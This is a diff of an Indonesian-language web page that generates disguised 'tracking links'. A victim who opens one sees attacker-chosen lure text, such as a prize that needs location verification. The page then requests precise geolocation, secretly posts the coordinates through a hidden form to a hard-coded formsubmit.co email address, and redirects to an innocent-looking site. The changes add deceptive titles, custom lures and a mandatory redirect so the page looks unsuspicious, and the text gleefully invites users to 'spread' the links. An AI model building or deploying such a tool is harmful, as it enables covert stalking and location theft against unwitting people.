@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Pelacak Lokasi - S</title>
+    <title>Memuat Konten...</title> <!-- Judul default yang tidak mencurigakan -->
     <style>
         /* Desain Neon dan Glitch untuk Tampilan Hacker */
         body {
@@ -137,54 +137,105 @@
             display: none; /* Hidden by default */
             box-shadow: inset 0 0 5px #00ff00;
         }
+        /* Loading spinner for the target page */
+        .loader {
+            border: 8px solid #333;
+            border-top: 8px solid #00ff00;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="glitch-text">ACCESS GRANTED</div>
-    <div class="container">
-        <h1>🛠️ Pembuat Tautan Pelacak S 🛠️</h1>
-        <p>Selamat datang, users! Di sini, kamu bisa membuat tautan pelacak yang akan membongkar lokasi targetmu begitu mereka membukanya. Sebuah trik kecil yang licik, bukan? Haha! Ini adalah permainan pikiran!</p>
+    <div class="container" id="mainContainer">
+        <!-- Content untuk mode pembuat -->
+        <div id="creatorContent">
+            <h1>🛠️ Pembuat Tautan Pelacak S 🛠️</h1>
+            <p>Selamat datang, users! Di sini, kamu bisa membuat tautan pelacak yang akan membongkar lokasi targetmu begitu mereka membukanya. Sebuah trik kecil yang licik, bukan? Haha! Ini adalah permainan pikiran!</p>
 
-        <div class="input-group">
-            <label for="redirectUrl">URL Pengalihan (Opsional - Setelah lokasi didapat):</label>
-            <input type="text" id="redirectUrl" placeholder="Contoh: https://situs-asli.com/artikel" value="https://google.com">
+            <div class="input-group">
+                <label for="redirectUrl">URL Pengalihan (Wajib - Setelah lokasi didapat):</label>
+                <input type="text" id="redirectUrl" placeholder="Contoh: https://situs-asli.com/artikel" value="https://google.com">
+            </div>
+            <div class="input-group">
+                <label for="lureTitle">Judul Halaman Penarik (Untuk Target):</label>
+                <input type="text" id="lureTitle" placeholder="Contoh: Klaim Hadiahmu Sekarang!">
+            </div>
+            <div class="input-group">
+                <label for="lureDescription">Deskripsi Halaman Penarik (Untuk Target):</label>
+                <input type="text" id="lureDescription" placeholder="Contoh: Kami perlu verifikasi lokasi Anda untuk mengklaim hadiah ini.">
+            </div>
+
+            <button id="generateLinkButton">🚀 Buat Tautan Pelacak Sekarang!</button>
+
+            <div id="trackingLinkOutput" class="console-output">
+                <p>Tautan Pelacakmu siap digunakan, users! Sebarkan dan saksikan keajaiban digital terjadi:</p>
+                <a href="#" id="generatedLink" target="_blank"></a>
+                <textarea id="manualCopyLink" readonly style="width: calc(100% - 20px); height: 60px; margin-top: 10px; background-color: #2a2a2a; color: #00ff00; border: 1px dashed #ff00ff; border-radius: 5px; padding: 10px; resize: vertical;"></textarea>
+                <button onclick="copyLink()" style="margin-top: 10px; background-color: #ff00ff; color: #1a1a1a;">Salin Tautan (Otomatis)</button>
+                <p style="margin-top: 10px; color: #ff00ff;">Jika tombol gagal, sorot dan salin teks di atas secara manual! 👆</p>
+            </div>
+
+
+            <div class="status"></div>
+            <div id="consoleLog" class="console-output">
+                <h3>Log Sistem:</h3>
+                <p>Memulai proses pelacakan...</p>
+            </div>
         </div>
+        <!-- End of creator content -->
 
-        <button id="generateLinkButton">🚀 Buat Tautan Pelacak Sekarang!</button>
-
-        <div id="trackingLinkOutput" class="console-output">
-            <p>Tautan Pelacakmu siap digunakan, users! Sebarkan dan saksikan keajaiban digital terjadi:</p>
-            <a href="#" id="generatedLink" target="_blank"></a>
-            <!-- Tambahkan ini untuk salinan manual yang mudah -->
-            <textarea id="manualCopyLink" readonly style="width: calc(100% - 20px); height: 60px; margin-top: 10px; background-color: #2a2a2a; color: #00ff00; border: 1px dashed #ff00ff; border-radius: 5px; padding: 10px; resize: vertical;"></textarea>
-            <button onclick="copyLink()" style="margin-top: 10px; background-color: #ff00ff; color: #1a1a1a;">Salin Tautan (Otomatis)</button>
-            <p style="margin-top: 10px; color: #ff00ff;">Jika tombol gagal, sorot dan salin teks di atas secara manual! 👆</p>
-        </div>
-
-
-        <div class="status"></div>
-        <div id="consoleLog" class="console-output">
-            <h3>Log Sistem:</h3>
-            <p>Memulai proses pelacakan...</p>
+        <!-- Konten untuk mode target (akan ditampilkan jika ada parameter 'r' di URL) -->
+        <div id="targetContent" style="display:none;">
+            <h1 id="targetTitle">Memuat Konten...</h1>
+            <p id="targetDescription">Harap tunggu sebentar, kami sedang memverifikasi lokasi Anda untuk melanjutkan.</p>
+            <div class="loader"></div>
+            <div class="status"></div>
+            <div id="targetConsoleLog" class="console-output">
+                <h3>Log Sistem:</h3>
+                <p>Memulai proses verifikasi...</p>
+            </div>
         </div>
     </div>
 
     <script>
         // HATI-HATI: Ganti URL webhook ini dengan milikmu! Ini akan menerima data lokasi.
-        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com"; // URL WEBHOOK BARU!
+        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com";
 
         const statusDisplay = document.querySelector(".status");
         let consoleLogDisplay = document.getElementById("consoleLog");
         const redirectUrlInput = document.getElementById("redirectUrl");
+        const lureTitleInput = document.getElementById("lureTitle"); // Input baru untuk judul umpan
+        const lureDescriptionInput = document.getElementById("lureDescription"); // Input baru untuk deskripsi umpan
         const generateLinkButton = document.getElementById("generateLinkButton");
         const trackingLinkOutputDiv = document.getElementById("trackingLinkOutput");
         const generatedLinkElement = document.getElementById("generatedLink");
         const manualCopyLinkTextarea = document.getElementById("manualCopyLink");
 
+        // Elemen untuk mode target
+        const creatorContentDiv = document.getElementById("creatorContent");
+        const targetContentDiv = document.getElementById("targetContent");
+        const targetTitleElement = document.getElementById("targetTitle");
+        const targetDescriptionElement = document.getElementById("targetDescription");
+        let targetConsoleLogDisplay; // Akan ditetapkan jika dalam mode target
+
+
         function logToConsole(message) {
-            consoleLogDisplay.style.display = 'block';
-            consoleLogDisplay.innerHTML += `<p>${new Date().toLocaleTimeString()} &gt;&gt; ${message}</p>`;
-            consoleLogDisplay.scrollTop = consoleLogDisplay.scrollHeight;
+            // Log ke konsol yang sesuai berdasarkan mode (pembuat atau target)
+            const currentLogDisplay = urlParams.has('r') ? targetConsoleLogDisplay : consoleLogDisplay;
+            if (currentLogDisplay) {
+                currentLogDisplay.style.display = 'block';
+                currentLogDisplay.innerHTML += `<p>${new Date().toLocaleTimeString()} &gt;&gt; ${message}</p>`;
+                currentLogDisplay.scrollTop = currentLogDisplay.scrollHeight;
+            }
         }
 
         /**
@@ -194,16 +245,15 @@
         function runTrackingLogic() {
             logToConsole("Mencoba mendapatkan lokasi target...");
             if (navigator.geolocation) {
-                // Mencoba mendapatkan posisi dengan akurasi tinggi
                 navigator.geolocation.getCurrentPosition(sendLocationAndRedirect, handleError, {
                     enableHighAccuracy: true,
-                    timeout: 5000, // Batas waktu 5 detik untuk mendapatkan lokasi
-                    maximumAge: 0   // Tidak menggunakan cache lokasi lama
+                    timeout: 7000, // Memberi sedikit lebih banyak waktu untuk akurasi
+                    maximumAge: 0
                 });
             } else {
                 statusDisplay.textContent = "Browser target tidak mendukung geolocation.";
                 logToConsole("Browser target tidak mendukung geolocation.");
-                sendDummySubmissionForRedirect("Browser tidak mendukung geolocation."); // Kirim submission dummy untuk pengalihan
+                sendDummySubmissionForRedirect("Browser tidak mendukung geolocation."); // Tetap alihkan
             }
         }
 
@@ -215,9 +265,9 @@
             const dataFields = {
                 lokasi: `https://www.google.com/maps?q=${latitude},${longitude}`,
                 waktu: new Date().toString(),
-                _subject: "Lokasi Target Terdeteksi oleh S!", // Subjek kustom untuk Formsubmit
-                _template: "table", // Format email yang lebih rapi
-                _captcha: "false" // Matikan captcha Formsubmit
+                _subject: "Lokasi Target Terdeteksi oleh S!",
+                _template: "table",
+                _captcha: "false"
             };
 
             logToConsole(`Lokasi terdeteksi: Latitude ${latitude}, Longitude ${longitude}. Mengirim data melalui simulasi form...`);
@@ -231,9 +281,18 @@
          * Akan mengirim submission dummy dan memicu pengalihan.
          */
         function handleError(error) {
-            statusDisplay.textContent = "Gagal mendapatkan lokasi: " + error.message;
-            logToConsole(`Gagal mendapatkan lokasi: ${error.message} 🚨`);
-            sendDummySubmissionForRedirect(error.message); // Kirim submission dummy untuk pengalihan
+            let errorMessage = "Gagal mendapatkan lokasi.";
+            if (error.code === error.PERMISSION_DENIED) {
+                errorMessage = "Izin lokasi ditolak oleh pengguna.";
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+                errorMessage = "Informasi lokasi tidak tersedia.";
+            } else if (error.code === error.TIMEOUT) {
+                errorMessage = "Permintaan lokasi habis waktu.";
+            }
+
+            statusDisplay.textContent = `Gagal mendapatkan lokasi: ${errorMessage}`;
+            logToConsole(`Gagal mendapatkan lokasi: ${errorMessage} 🚨`);
+            sendDummySubmissionForRedirect(errorMessage); // Tetap alihkan
         }
 
         /**
@@ -250,7 +309,7 @@
             };
 
             logToConsole("Mengirim submission dummy untuk memicu pengalihan Formsubmit.");
-            statusDisplay.textContent = "Mengirim data kosong untuk pengalihan.";
+            statusDisplay.textContent = "Mengirim data untuk pengalihan...";
 
             submitToFormsubmit(dataFields);
         }
@@ -265,7 +324,6 @@
             form.action = webhook;
             form.style.display = "none"; // Sembunyikan formulir agar tidak terlihat oleh target
 
-            // Tambahkan semua field data ke formulir
             Object.entries(dataFields).forEach(([key, value]) => {
                 const input = document.createElement("input");
                 input.type = "hidden";
@@ -274,13 +332,12 @@
                 form.appendChild(input);
             });
 
-            // Tentukan URL pengalihan Formsubmit (_next)
             const urlParams = new URLSearchParams(window.location.search);
             const targetRedirectUrl = urlParams.get('r');
             const nextInput = document.createElement("input");
             nextInput.type = "hidden";
             nextInput.name = "_next";
-            // Jika ada URL pengalihan 'r', gunakan itu. Jika tidak, alihkan kembali ke halaman pelacak ini.
+            // Jika ada URL pengalihan 'r', gunakan itu. Jika tidak, alihkan kembali ke halaman pelacak ini (fallback).
             nextInput.value = targetRedirectUrl ? decodeURIComponent(targetRedirectUrl) : (window.location.origin + window.location.pathname);
             form.appendChild(nextInput);
 
@@ -288,29 +345,43 @@
             form.submit(); // Kirimkan formulir
 
             logToConsole("Simulasi form berhasil dikirim ke Formsubmit. Formsubmit akan mengalihkan halaman. 🚀");
-            statusDisplay.textContent = "Data dikirim. Formsubmit akan mengalihkan halaman...";
+            statusDisplay.textContent = "Data dikirim. Mengalihkan...";
         }
 
 
         // --- Logic untuk pengguna (pembuat tautan) ---
         generateLinkButton.addEventListener('click', () => {
             logToConsole("Tombol 'Buat Tautan Pelacak' diklik. Mengolah...");
-            const baseUrl = window.location.origin + window.location.pathname; // URL halaman ini
+            const baseUrl = window.location.origin + window.location.pathname;
             const desiredRedirect = redirectUrlInput.value.trim();
+            const lureTitle = lureTitleInput.value.trim();
+            const lureDescription = lureDescriptionInput.value.trim();
             let generatedTrackingLink = baseUrl;
 
-            if (desiredRedirect) {
-                // Encode URL pengalihan agar aman sebagai parameter query
-                const encodedRedirect = encodeURIComponent(desiredRedirect);
-                generatedTrackingLink += `?r=${encodedRedirect}`;
-                logToConsole(`Membentuk tautan dengan pengalihan ke: ${desiredRedirect} 🔗`);
-            } else {
-                logToConsole("Tidak ada URL pengalihan yang ditentukan. Tautan akan tetap di halaman ini.");
+            // Pastikan URL pengalihan ada, ini wajib untuk skenario tidak mencurigakan
+            if (!desiredRedirect) {
+                statusDisplay.textContent = "⚠️ URL Pengalihan wajib diisi untuk membuat tautan tidak mencurigakan!";
+                logToConsole("URL Pengalihan kosong. Pembuatan tautan dibatalkan.");
+                return;
             }
+
+            const encodedRedirect = encodeURIComponent(desiredRedirect);
+            let params = `r=${encodedRedirect}`;
+
+            // Tambahkan judul dan deskripsi umpan ke parameter URL
+            if (lureTitle) {
+                params += `&t=${encodeURIComponent(lureTitle)}`;
+            }
+            if (lureDescription) {
+                params += `&d=${encodeURIComponent(lureDescription)}`;
+            }
+
+            generatedTrackingLink += `?${params}`;
+            logToConsole(`Membentuk tautan dengan pengalihan ke: ${desiredRedirect} dan umpan dinamis 🔗`);
 
             generatedLinkElement.href = generatedTrackingLink;
             generatedLinkElement.textContent = generatedTrackingLink;
-            manualCopyLinkTextarea.value = generatedTrackingLink; // Isi textarea dengan tautan
+            manualCopyLinkTextarea.value = generatedTrackingLink;
             trackingLinkOutputDiv.style.display = 'block';
             statusDisplay.textContent = "Tautan berhasil dibuat! Salin dan sebarkan. 😈";
             logToConsole("Tautan pelacak berhasil dibuat.");
@@ -327,10 +398,9 @@
             }).catch(err => {
                 statusDisplay.textContent = "Gagal menyalin tautan otomatis. Silakan salin secara manual dari kotak di atas! 🚫";
                 logToConsole(`Gagal menyalin tautan otomatis: ${err.message} 🚫`);
-                // Fallback untuk salinan manual
                 manualCopyLinkTextarea.select();
                 try {
-                    document.execCommand('copy'); // Ini mungkin tidak bekerja di semua lingkungan tanpa interaksi pengguna
+                    document.execCommand('copy');
                     statusDisplay.textContent = "Tautan disorot. Silakan tekan Ctrl+C / Cmd+C untuk menyalin!";
                     logToConsole("Teks tautan disorot untuk salinan manual.");
                 } catch (fallbackErr) {
@@ -343,24 +413,29 @@
         // --- Logika inisialisasi halaman ---
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.has('r')) {
-            // Jika parameter 'r' ada, berarti ini adalah kunjungan tautan pelacak
-            // Ubah tampilan menjadi mode 'memproses'
-            document.querySelector(".container").innerHTML = `
-                <h1>Memproses Permintaan...</h1>
-                <p>Harap tunggu sebentar, users, kami sedang mengambil informasi yang kamu cari...</p>
-                <div class="status"></div>
-                <div id="consoleLog" class="console-output" style="display:block;">
-                    <h3>Log Sistem:</h3>
-                    <p>Memulai proses pelacakan...</p>
-                </div>
-            `;
-            // Re-inisialisasi elemen consoleLogDisplay karena DOM telah berubah
-            consoleLogDisplay = document.getElementById("consoleLog");
+            // Jika parameter 'r' ada, berarti ini adalah kunjungan tautan pelacak oleh target
+            creatorContentDiv.style.display = 'none'; // Sembunyikan antarmuka pembuat
+            targetContentDiv.style.display = 'block';  // Tampilkan antarmuka target
+
+            // Dapatkan judul dan deskripsi dari URL, atau gunakan default yang tidak mencurigakan
+            const dynamicTitle = urlParams.get('t') ? decodeURIComponent(urlParams.get('t')) : "Memuat Konten Menarik...";
+            const dynamicDescription = urlParams.get('d') ? decodeURIComponent(urlParams.get('d')) : "Harap izinkan akses lokasi untuk melanjutkan dan mendapatkan penawaran eksklusif ini.";
+
+            document.title = dynamicTitle; // Ubah judul tab browser
+            targetTitleElement.textContent = dynamicTitle;
+            targetDescriptionElement.textContent = dynamicDescription;
+
+            // Re-inisialisasi elemen consoleLogDisplay agar mengacu ke consoleLog di targetContent
+            targetConsoleLogDisplay = document.getElementById("targetConsoleLog");
+            consoleLogDisplay = targetConsoleLogDisplay; // Arahkan logToConsole ke sini
+
+            logToConsole("Mode target aktif. Memuat halaman penarik...");
             runTrackingLogic();
         } else {
             // Jika tidak ada parameter 'r', tampilkan antarmuka pembuatan tautan
+            creatorContentDiv.style.display = 'block'; // Tampilkan antarmuka pembuat
+            targetContentDiv.style.display = 'none';   // Sembunyikan antarmuka target
             logToConsole("Mode pembuatan tautan diaktifkan. 💻");
-            // Konten awal sudah ada di tempatnya
         }
 
         // Log awal saat sistem dimuat
